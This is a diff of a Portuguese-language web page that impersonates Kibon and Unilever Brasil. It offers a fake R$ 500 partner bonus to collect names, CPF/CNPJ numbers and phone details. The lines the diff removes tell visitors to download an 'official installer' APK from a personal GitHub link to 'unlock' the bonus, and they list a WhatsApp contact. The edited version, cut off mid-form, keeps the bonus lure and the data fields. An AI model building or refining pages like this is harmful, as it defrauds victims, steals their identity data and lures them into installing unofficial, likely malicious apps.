@@ -3,212 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Parceiro Kibon - Cadastro e Bônus</title>
+    <title>Parceiro Kibon - Cadastro</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Inter', sans-serif; }
-        .gradient-brand { background: linear-gradient(135deg, #E30613 0%, #ff4d4d 100%); }
-        .input-error { border-color: #ef4444 !important; background-color: #fef2f2 !important; outline: 2px solid #ef4444 !important; }
+        .bg-kibon { background-color: #E30613; }
+        .text-kibon { color: #E30613; }
+        .border-kibon { border-color: #E30613; }
+        .input-error { border-color: #ef4444 !important; background-color: #fef2f2 !important; }
+        .btn-gradient { background: linear-gradient(180deg, #E30613 0%, #b3050f 100%); }
     </style>
 </head>
-<body class="bg-slate-50 min-h-screen py-10 px-4">
+<body class="bg-gray-100 min-h-screen">
 
-    <div class="max-w-3xl mx-auto bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100">
-        
-        <div class="gradient-brand p-8 text-white text-center">
-            <div class="bg-white inline-block px-4 py-2 rounded-full mb-4 shadow-sm">
-                <span class="text-red-600 font-bold text-sm tracking-widest uppercase italic">Kibon</span>
-            </div>
-            <h1 class="text-3xl font-extrabold mb-2">Seja um Parceiro Oficial</h1>
-            <p class="text-red-100 opacity-95 font-medium italic text-lg">Use seus R$ 500 no aplicativo agora!</p>
-        </div>
-
-        <form id="formCadastro" class="p-8 space-y-6">
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Nome Completo</label>
-                    <input type="text" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                </div>
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Nome do Comércio</label>
-                    <input type="text" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                </div>
-            </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">CNPJ ou CPF</label>
-                    <input type="text" id="documento" placeholder="000.000.000-00" required 
-                           class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                    <p id="error-msg" class="hidden text-red-600 text-[10px] font-bold ml-1 mt-1 uppercase">Documento Inválido! Verifique os números.</p>
-                </div>
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Modelo do Celular</label>
-                    <select required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                        <option value="" selected disabled>Selecione seu aparelho...</option>
-                        <option>Samsung (Android)</option>
-                        <option>Motorola (Android)</option>
-                        <option>Xiaomi / Redmi (Android)</option>
-                        <option>LG (Android)</option>
-                        <option>iPhone (iOS)</option>
-                        <option>Outro Android</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Estado (UF)</label>
-                    <select id="estado" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                        <option value="" selected disabled>Selecione o Estado...</option>
-                        <option value="AC">Acre</option>
-                        <option value="AL">Alagoas</option>
-                        <option value="AP">Amapá</option>
-                        <option value="AM">Amazonas</option>
-                        <option value="BA">Bahia</option>
-                        <option value="CE">Ceará</option>
-                        <option value="DF">Distrito Federal</option>
-                        <option value="ES">Espírito Santo</option>
-                        <option value="GO">Goiás</option>
-                        <option value="MA">Maranhão</option>
-                        <option value="MT">Mato Grosso</option>
-                        <option value="MS">Mato Grosso do Sul</option>
-                        <option value="MG">Minas Gerais</option>
-                        <option value="PA">Pará</option>
-                        <option value="PB">Paraíba</option>
-                        <option value="PR">Paraná</option>
-                        <option value="PE">Pernambuco</option>
-                        <option value="PI">Piauí</option>
-                        <option value="RJ">Rio de Janeiro</option>
-                        <option value="RN">Rio Grande do Norte</option>
-                        <option value="RS">Rio Grande do Sul</option>
-                        <option value="RO">Rondônia</option>
-                        <option value="RR">Roraima</option>
-                        <option value="SC">Santa Catarina</option>
-                        <option value="SP">São Paulo</option>
-                        <option value="SE">Sergipe</option>
-                        <option value="TO">Tocantins</option>
-                    </select>
-                </div>
-                <div class="space-y-1">
-                    <label class="text-xs font-bold text-gray-500 uppercase ml-1">Cidade</label>
-                    <input type="text" placeholder="Digite sua cidade" required class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-red-500 outline-none bg-gray-50 transition-all">
-                </div>
-            </div>
-
-            <div class="bg-red-50 rounded-3xl p-8 border border-red-100 text-center">
-                <h3 class="text-red-700 font-bold text-lg mb-2 uppercase">🎁 Validar Bônus de R$ 500</h3>
-                <p class="text-sm text-red-600 mb-6 font-semibold">Baixe o instalador oficial abaixo para liberar seu saldo.</p>
-                
-                <div class="flex flex-col items-center gap-3">
-                    <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" 
-                       id="btnDownload" 
-                       class="w-full max-w-xs bg-black text-white px-6 py-4 rounded-2xl flex items-center justify-center gap-4 hover:bg-gray-900 transition-all transform active:scale-95 shadow-xl shadow-black/20">
-                        <svg class="w-8 h-8 fill-white" viewBox="0 0 24 24"><path d="M17.523 15.3414C16.8926 15.3414 16.3765 14.8253 16.3765 14.1949V9.21373C16.3765 8.58329 16.8926 8.06718 17.523 8.06718C18.1534 8.06718 18.6696 8.58329 18.6696 9.21373V14.1949C18.6696 14.8253 18.1534 15.3414 17.523 15.3414ZM6.47696 15.3414C5.84652 15.3414 5.33041 14.8253 5.33041 14.1949V9.21373C5.33041 8.58329 5.84652 8.06718 6.47696 8.06718C7.1074 8.06718 7.62351 8.58329 7.62351 9.21373V14.1949C7.62351 14.8253 7.1074 15.3414 6.47696 15.3414Z"></path></svg>
-                        <div class="text-left">
-                            <p class="text-[10px] leading-none opacity-70 font-bold uppercase">Download Direto</p>
-                            <p class="text-lg font-bold leading-none">Baixar App</p>
-                        </div>
-                    </a>
-                    <p id="downloadMsg" class="hidden text-green-600 font-bold text-xs animate-pulse mt-2 italic">Download iniciado! Instale o arquivo.</p>
-                </div>
-            </div>
-
-            <div class="space-y-4 pt-4 border-t border-gray-100">
-                <button type="submit" class="w-full gradient-brand text-white font-bold py-4 rounded-2xl shadow-lg transition-all active:scale-[0.98] uppercase tracking-wider">
-                    Finalizar Cadastro e Receber R$ 500
-                </button>
-                
-                <a href="https://wa.me/555499422678?text=Olá! Tenho uma dúvida sobre o cadastro Kibon." 
-                   target="_blank"
-                   class="w-full flex items-center justify-center gap-2 border-2 border-green-500 text-green-600 font-bold py-4 rounded-2xl hover:bg-green-50 transition-colors text-center px-4">
-                    FALE COM O SUPORTE PARA QUALQUER DÚVIDA
-                </a>
-            </div>
-        </form>
-
-        <div class="bg-gray-100 p-4 text-center">
-            <p class="text-[9px] text-gray-400 uppercase tracking-widest font-bold">Unilever Brasil - Logística Kibon Oficial</p>
+    <div class="bg-kibon py-4 px-4 shadow-md text-center">
+        <div class="bg-white inline-block px-6 py-1 rounded-full">
+            <span class="text-kibon font-black italic text-xl tracking-tighter">Kibon</span>
         </div>
     </div>
 
-    <script>
-        const form = document.getElementById('formCadastro');
-        const inputDoc = document.getElementById('documento');
-        const errorMsg = document.getElementById('error-msg');
-        const btnDownload = document.getElementById('btnDownload');
+    <div class="max-w-md mx-auto mt-6 px-4 pb-12">
+        <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
+            
+            <div class="p-6 text-center border-b border-gray-100">
+                <h1 class="text-2xl font-extrabold text-gray-800">Cadastro de Parceiro</h1>
+                <p class="text-gray-500 text-sm font-medium">Preencha os dados para liberar seu bônus de <span class="text-kibon font-bold">R$ 500,00</span></p>
+            </div>
 
-        btnDownload.addEventListener('click', () => {
-            document.getElementById('downloadMsg').classList.remove('hidden');
-        });
+            <form id="formCadastro" class="p-6 space-y-5">
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Nome Completo</label>
+                        <input type="text" required placeholder="Digite seu nome" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-all">
+                    </div>
 
-        function validarDocumento(val) {
-            val = val.replace(/[^\d]+/g, '');
-            if (val.length === 11) return validarCPF(val);
-            if (val.length === 14) return validarCNPJ(val);
-            return false;
-        }
+                    <div>
+                        <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Nome do Comércio</label>
+                        <input type="text" required placeholder="Nome da sua loja" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-all">
+                    </div>
 
-        function validarCPF(cpf) {
-            if (/^(\d)\1+$/.test(cpf)) return false;
-            let soma = 0, resto;
-            for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
-            resto = (soma * 10) % 11;
-            if ((resto == 10 || resto == 11)) resto = 0;
-            if (resto != parseInt(cpf.substring(9, 10))) return false;
-            soma = 0;
-            for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
-            resto = (soma * 10) % 11;
-            if ((resto == 10 || resto == 11)) resto = 0;
-            return resto == parseInt(cpf.substring(10, 11));
-        }
+                    <div>
+                        <label class="block text-xs font-bold text-gray-400 uppercase mb-1">CNPJ ou CPF</label>
+                        <input type="text" id="documento" required placeholder="000.000.000-00" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 focus:ring-1 focus:ring-red-500 outline-none transition-all">
+                        <p id="error-msg" class="hidden text-red-600 text-[10px] font-bold mt-1 uppercase">Documento Inválido!</p>
+                    </div>
 
-        function validarCNPJ(cnpj) {
-            if (/^(\d)\1+$/.test(cnpj)) return false;
-            let tamanho = cnpj.length - 2;
-            let numeros = cnpj.substring(0, tamanho);
-            let digitos = cnpj.substring(tamanho);
-            let soma = 0, pos = tamanho - 7;
-            for (let i = tamanho; i >= 1; i--) {
-                soma += numeros.charAt(tamanho - i) * pos--;
-                if (pos < 2) pos = 9;
-            }
-            let resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
-            if (resultado != digitos.charAt(0)) return false;
-            tamanho = tamanho + 1;
-            numeros = cnpj.substring(0, tamanho);
-            soma = 0;
-            pos = tamanho - 7;
-            for (let i = tamanho; i >= 1; i--) {
-                soma += numeros.charAt(tamanho - i) * pos--;
-                if (pos < 2) pos = 9;
-            }
-            resultado = soma % 11 < 2 ? 0 : 11 - (soma % 11);
-            return resultado == digitos.charAt(1);
-        }
+                    <div>
+                        <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Modelo do Celular</label>
+                        <select required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 outline-none bg-white">
+                            <option value="" disabled selected>Selecione...</option>
+                            <option>Samsung</option>
+                            <option>Motorola</option>
+                            <option>Xiaomi / Redmi</option>
+                            <option>iPhone</option>
+                            <option>LG / Outros</option>
+                        </select>
+                    </div>
 
-        inputDoc.addEventListener('blur', function() {
-            if (this.value && !validarDocumento(this.value)) {
-                this.classList.add('input-error');
-                errorMsg.classList.remove('hidden');
-            } else {
-                this.classList.remove('input-error');
-                errorMsg.classList.add('hidden');
-            }
-        });
-
-        form.addEventListener('submit', function(e) {
-            if (!validarDocumento(inputDoc.value)) {
-                e.preventDefault();
-                inputDoc.classList.add('input-error');
-                errorMsg.classList.remove('hidden');
-                inputDoc.focus();
-                alert('Por favor, insira um CPF ou CNPJ válido antes de finalizar.');
-            } else {
-                alert('Cadastro enviado com sucesso! Verifique seu bônus no App.');
-            }
-        });
-    </script>
-</body>
-</html>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold text-gray-400 uppercase mb-1">Estado (UF)</label>
+                            <select id="estado" required class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:border-red-500 outline-none bg-white text-sm">
+                                <option value="" disabled selected>UF</option>
+                                <option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option
